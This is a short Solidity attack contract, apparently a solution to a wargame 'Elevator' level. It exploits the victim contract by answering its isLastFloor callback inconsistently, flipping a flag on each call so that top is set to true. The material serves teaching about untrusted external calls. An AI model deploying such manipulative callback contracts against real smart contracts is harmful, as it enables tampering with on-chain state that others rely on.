// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./interfaces/IElevator.sol";

contract ElevatorAttack {
    IElevator private immutable victimElevator;
    bool private _isLastFloor = true;

    constructor(IElevator victimElevator_) {
        victimElevator = victimElevator_;
    }

    function attack() external {
        victimElevator.goTo(0);

        require(victimElevator.top() && 0 == victimElevator.floor(), "Elevator: Attack failed");
    }

    function isLastFloor(
        uint256 /* floor */
    ) external returns (bool) {
        return _isLastFloor = !_isLastFloor;
    }
}
